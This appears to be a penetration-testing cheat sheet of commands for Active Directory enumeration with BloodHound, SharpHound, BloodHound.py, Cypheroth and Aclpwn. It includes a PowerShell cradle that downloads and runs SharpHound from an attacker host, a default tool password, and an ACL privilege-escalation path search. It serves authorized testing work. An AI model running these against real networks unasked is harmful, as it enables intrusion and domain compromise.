# bloodhound

% bloodhound, Active directory enumeration

## Neo4j - Start Server
Starts the Neo4j database server, which is used by BloodHound.
#plateform/linux #target/serve #cat/UTILS
https://neo4j.com/docs/

```bash
neo4j start
```

## BloodHound - Start GUI
Launches the BloodHound graphical user interface.
#plateform/linux #target/local #cat/RECON
https://github.com/BloodHoundAD/BloodHound

```bash
bloodhound
```

## BloodHound.py - Collect Data (Basic)
Collects BloodHound data using BloodHound.py with basic authentication.
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -d <domain> -u <user> -p <password> -c all
```

## BloodHound.py - Collect Data (Advanced)
Collects BloodHound data using BloodHound.py with specified global catalog and domain controller.
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -d <domain> -u <user> -p <password> -gc <global_catalog> -dc <domain_controler> -c all
```

## SharpHound - Collect BloodHound Data
Collects BloodHound data using SharpHound PowerShell module.
#plateform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/BloodHoundAD/SharpHound

```powershell
Import-Module SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain <domain>
```

## SharpHound - Collect BloodHound Data (Download & Execute)
Downloads and executes SharpHound from a remote location to collect BloodHound data.
#plateform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/BloodHoundAD/SharpHound

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-Expression; Invoke-BloodHound -CollectionMethod All -Domain <domain>
```

## Cypheroth - Start
Starts Cypheroth, a tool for running Cypher queries against BloodHound's Neo4j backend.
#plateform/linux #target/local #cat/RECON 

https://github.com/seajaysec/cypheroth

```bash
cypheroth -u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <domain>
```

## Aclpwn - Dry Run (Computer to Domain)
Performs a dry run of Aclpwn to identify ACL-based privilege escalation paths from a computer to the domain.
#plateform/linux #target/local #cat/RECON 

https://github.com/fox-it/aclpwn.py

```
aclpwn -f <computer_name> -ft computer -d <domain> -dry
```



